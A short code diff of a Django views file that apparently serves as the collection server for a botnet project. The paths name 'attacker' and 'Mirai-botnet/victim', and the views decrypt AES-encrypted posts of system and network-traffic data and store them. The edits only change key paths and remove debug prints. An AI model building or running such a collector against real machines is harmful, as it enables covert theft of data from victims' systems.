@@ -14,8 +14,8 @@ from django.utils import timezone
 from datetime import datetime
 from django.core import serializers
 
-SECRET_KEY_PATH = "/home/attacker/scripts/secret.key"
-IV_PATH = "/home/attacker/scripts/iv.txt"
+SECRET_KEY_PATH = "/home/attacker/tttest/Mirai-botnet/victim/secret.key"
+IV_PATH = "/home/attacker/tttest/Mirai-botnet/victim/iv.txt"
 
 # Function to decrypt data using AES
 
@@ -32,14 +32,12 @@ def decrypt_data(encrypted_message):
     with open(IV_PATH, 'r') as iv_file:
         iv_hex = iv_file.read().strip()
         iv = bytes.fromhex(iv_hex)  # Convert hex IV to bytes
-
     encrypted_message_bytes = base64.b64decode(encrypted_message)
 
     # Perform the AES decryption
     cipher = AES.new(secret_key, AES.MODE_CBC, iv)
     decrypted_message_bytes = unpad(cipher.decrypt(encrypted_message_bytes), AES.block_size)
-    
-    
+
     return decrypted_message_bytes.decode('utf-8')
 
 # SystemData view for handling system data
@@ -61,7 +59,7 @@ class SystemDataList(View):
             decrypted_data = decrypt_data(test1)
             parsed_data = urllib.parse.parse_qs(decrypted_data)
             # Print the parsed data
-            print(parsed_data)
+
             for key, value in parsed_data.items():
                 parsed_data[key] = value[0].strip("'")
             data = parsed_data
@@ -133,7 +131,6 @@ class NetworkTrafficList(View):
             
             # Convert time_sent string to a datetime.time object
             time_sent_obj = datetime.strptime(time_sent_str, '%H:%M:%S.%f').time()
-            print("time " , time_sent_obj)
             # Create new network traffic record
             network_traffic = NetworkTraffic.objects.create(
                 interface=data.get('interface'),
